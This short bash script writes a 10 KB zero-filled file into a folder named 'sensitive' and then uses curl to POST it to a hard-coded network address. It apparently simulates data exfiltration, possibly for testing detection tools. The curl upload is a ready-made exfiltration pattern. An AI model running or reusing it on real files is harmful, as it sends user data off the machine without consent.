#!/bin/bash

dd if=/dev/zero of=~/sensitive/largefile.txt bs=1024 count=10

curl -X POST --data-binary "@/home/$USER/sensitive/largefile.txt" http://192.168.11.152:8080
